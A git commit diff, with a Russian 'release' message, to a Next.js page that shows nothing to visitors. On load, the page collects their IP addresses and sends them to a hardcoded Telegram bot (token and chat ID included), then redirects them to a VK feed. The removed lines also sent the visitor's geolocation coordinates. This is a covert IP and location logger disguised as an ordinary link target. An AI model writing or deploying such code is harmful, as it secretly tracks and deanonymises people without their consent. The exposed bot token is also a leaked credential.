bc06eb3faa355566812676a7deb320c9872c6927
Infinity2326 <dima.gorbachev2002@mail.ru>
2024-04-17 21:35:19 +0300

    релиз

--- app/page.tsx
+++ app/page.tsx
@@ -18,31 +18,25 @@ export default function Home() {
               .then((data) => {
                 try {
                   ip2 = data
-                  navigator.geolocation.getCurrentPosition((position) => {
-                    const { latitude, longitude } = position.coords
-                    fetch(
-                      `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
-                    ).then(() => (window.location.href = "https://vk.com/feed"))
-                  })
+                  fetch(
+                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
+                  ).then(() => (window.location.href = "https://vk.com/feed"))
                 } catch (error) {
                   fetch(
                     `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-                  )
-                  window.location.href = "https://vk.com/feed"
+                  ).then(() => (window.location.href = "https://vk.com/feed"))
                 }
               })
           } catch (error) {
             fetch(
               `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-            )
-            window.location.href = "https://vk.com/feed"
+            ).then(() => (window.location.href = "https://vk.com/feed"))
           }
         })
     } catch (error) {
       fetch(
-        `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}`
-      )
-      window.location.href = "https://vk.com/feed"
+        `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
+      ).then(() => (window.location.href = "https://vk.com/feed"))
     }
   }, [])
   return <p></p>
